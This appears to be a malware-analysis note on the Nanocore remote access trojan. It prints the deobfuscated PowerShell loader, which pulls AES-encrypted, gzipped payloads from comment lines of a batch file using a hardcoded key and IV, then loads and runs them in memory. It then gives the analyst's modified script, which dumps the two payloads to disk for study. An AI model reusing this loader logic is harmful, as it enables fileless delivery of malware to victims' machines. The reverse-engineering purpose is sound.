### Nanocore Deobfuscated script

```ps
function Decrypt($ciphertext) {
	$AESObj=[System.Security.Cryptography.Aes]::Create();	
	$AESObj.Mode=[System.Security.Cryptography.CipherMode]::CBC;	
	$AESObj.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;	
	$AESObj.Key=[convert]::FromBase64String('cZ0oCR9ckk8ylR37doxWSgpmHvZQk0eofx53d15npOg=');	
	$AESObj.IV=[convert]::FromBase64String('5LS/5s72ivLTO6XBqeLx6Q==');	
	$AES_DecryptObj=$AESObj.CreateDecryptor();	
	$return_var=$AES_DecryptObj.TransformFinalBlock($ciphertext, 0, $ciphertext.Length);	
	$AES_DecryptObj.Dispose();	
	$AESObj.Dispose();	
	$return_var;
}

function Decompress($ciphertext) {
	$MemoryStreamobj=New-Object System.IO.MemoryStream(,$ciphertext);	
	$DataCopiedTo=New-Object System.IO.MemoryStream;	
	$DecompressObj=New-Object System.IO.Compression.GZipStream($MemoryStreamobj, [IO.Compression.CompressionMode]::Decompress);	
	$DecompressObj.CopyTo($DataCopiedTo);	
	$DecompressObj.Dispose();	
	$MemoryStreamobj.Dispose();	
	$DataCopiedTo.Dispose();	
	$DataCopiedTo.ToArray();
}

function LoadPE($ciphertext,$Garbage) {
	$PEObj=[System.Reflection.Assembly]::Load([byte[]]$ciphertext);	
	$PE_Entrypoint=$PEObj.EntryPoint;	
	$PE_Entrypoint.Invoke($null, $Garbage);
}

$batchscript_data=[System.IO.File]::ReadAllText('tor_server.txt').Split([Environment]::NewLine);

foreach ($i in $batchscript_data) {
	if ($i.StartsWith(':: ')){
		$data_substr=$i.Substring(3);		
		break;	
	}
}

$data_substr_split=[string[]]$data_substr.Split('\');
$array1=Decompress (Decrypt ([convert]::FromBase64String($data_substr_split[0])));
$array2=Decompress (Decrypt ([convert]::FromBase64String($data_substr_split[1])));

LoadPE $array2 (,[string[]] (''));
LoadPE $array1 (,[string[]] (''));
```

### Nanocore Decryption Script

```ps
function Decrypt($ciphertext) {
	$AESObj=[System.Security.Cryptography.Aes]::Create();	
	$AESObj.Mode=[System.Security.Cryptography.CipherMode]::CBC;	
	$AESObj.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;	
	$AESObj.Key=[convert]::FromBase64String('cZ0oCR9ckk8ylR37doxWSgpmHvZQk0eofx53d15npOg=');	
	$AESObj.IV=[convert]::FromBase64String('5LS/5s72ivLTO6XBqeLx6Q==');	
	$AES_DecryptObj=$AESObj.CreateDecryptor();	
	$return_var=$AES_DecryptObj.TransformFinalBlock($ciphertext, 0, $ciphertext.Length);	
	$AES_DecryptObj.Dispose();	
	$AESObj.Dispose();	
	$return_var;
}

function Decompress($ciphertext) {
	$MemoryStreamobj=New-Object System.IO.MemoryStream(,$ciphertext);	
	$DataCopiedTo=New-Object System.IO.MemoryStream;	
	$DecompressObj=New-Object System.IO.Compression.GZipStream($MemoryStreamobj, [IO.Compression.CompressionMode]::Decompress);	
	$DecompressObj.CopyTo($DataCopiedTo);	
	$DecompressObj.Dispose();	
	$MemoryStreamobj.Dispose();	
	$DataCopiedTo.Dispose();	
	$DataCopiedTo.ToArray();
}

function LoadPE($ciphertext,$Garbage) {
	$PEObj=[System.Reflection.Assembly]::Load([byte[]]$ciphertext);	
	$PE_Entrypoint=$PEObj.EntryPoint;	
	$PE_Entrypoint.Invoke($null, $Garbage);
}

$batchscript_data=[System.IO.File]::ReadAllText('tor_server.txt').Split([Environment]::NewLine);

foreach ($i in $batchscript_data) {
	if ($i.StartsWith(':: ')){
		$data_substr=$i.Substring(3);		
		break;	
	}
}

$data_substr_split=[string[]]$data_substr.Split('\'); # Takes Data, substrings, splits
$array1=Decompress (Decrypt ([convert]::FromBase64String($data_substr_split[0]))); # Decrypts data array, Decompresses it via GZip
$array2=Decompress (Decrypt ([convert]::FromBase64String($data_substr_split[1]))); # Decrypts data array, Decompresses it via GZip

[system.io.file]::writeallbytes("payload1.dll", $array1);
[system.io.file]::writeallbytes("payload2.dll", $array2);
```
